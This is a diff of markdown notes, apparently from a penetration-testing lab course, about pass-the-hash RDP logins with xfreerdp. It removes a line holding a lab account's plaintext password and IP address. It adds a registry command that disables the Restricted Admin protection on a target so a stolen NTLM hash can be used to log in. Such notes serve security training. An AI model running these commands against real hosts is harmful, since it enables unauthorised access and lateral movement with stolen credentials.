@@ -36,4 +36,12 @@ xfreerdp [/d:domain] /u:<username> /pth:<hash> /v:$ip
 
 ```
 
-xfreerdp /d:domain /u:htb-student /p:"HTB_@cademy_stdnt!" /v:10.129.154.94 
+### Troubleshoot in PtH attack
+
+**Restricted Admin Mode**, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with the value of 0. It can be done using the following command:
+
+```powershell
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.
